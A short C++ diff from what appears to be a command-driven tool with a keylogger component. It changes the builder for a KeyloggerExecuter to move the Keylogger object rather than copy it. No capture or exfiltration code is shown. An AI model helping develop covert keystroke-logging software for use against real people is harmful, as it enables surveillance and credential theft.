@@ -24,7 +24,7 @@ utils::builders::BuildKeyloggerExecuter()
 
     Keylogger keylogger( impl );
 
-    return ( new command::KeyloggerExecuter(2, keylogger) );
+    return ( new command::KeyloggerExecuter(2, std::move(keylogger)) );
 }
 
 command::CommandManager*
